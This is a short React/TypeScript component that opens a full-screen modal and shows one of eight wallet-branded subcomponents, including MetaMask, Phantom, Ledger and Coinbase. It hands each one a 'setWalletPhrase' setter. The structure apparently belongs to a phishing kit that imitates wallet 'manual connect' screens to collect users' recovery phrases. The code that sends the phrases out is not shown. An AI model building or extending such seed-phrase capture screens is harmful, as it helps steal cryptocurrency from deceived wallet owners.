import Atomic from "./atomic";
import Coinbase from "./coinbase";
import Exodus from "./exedus";
import Keplr from "./keplr";
import Ledger from "./ledger";
import MetaMask from "./meta-mask";
import Phantom from "./phantom";
import TrustWallet from "./trust-wallet";

interface ShowManualProps {
	selectedWallet: string;
	handleFinish: () => void;
	setWalletPhrase: any;
}

function ShowManualWallets({
	selectedWallet,
	handleFinish,
	setWalletPhrase,
}: ShowManualProps) {
	return (
		<>
			<section className="fixed inset-0 bg-black/80 flex justify-center items-center">
				{selectedWallet == "metamask" && (
					<MetaMask
						handleFinish={handleFinish}
						setWalletPhrase={setWalletPhrase}
					/>
				)}
				{selectedWallet == "phantom" && (
					<Phantom
						handleFinish={handleFinish}
						setWalletPhrase={setWalletPhrase}
					/>
				)}
				{selectedWallet == "exodus" && (
					<Exodus
						handleFinish={handleFinish}
						setWalletPhrase={setWalletPhrase}
					/>
				)}
				{selectedWallet == "keplr" && (
					<Keplr
						handleFinish={handleFinish}
						setWalletPhrase={setWalletPhrase}
					/>
				)}
				{selectedWallet == "atomic" && (
					<Atomic
						handleFinish={handleFinish}
						setWalletPhrase={setWalletPhrase}
					/>
				)}
				{selectedWallet == "trustwallet" && (
					<TrustWallet
						handleFinish={handleFinish}
						setWalletPhrase={setWalletPhrase}
					/>
				)}
				{selectedWallet == "coinbase" && (
					<Coinbase
						handleFinish={handleFinish}
						setWalletPhrase={setWalletPhrase}
					/>
				)}
				{selectedWallet == "ledger" && (
					<Ledger
						handleFinish={handleFinish}
						setWalletPhrase={setWalletPhrase}
					/>
				)}
			</section>
		</>
	);
}

export default ShowManualWallets;
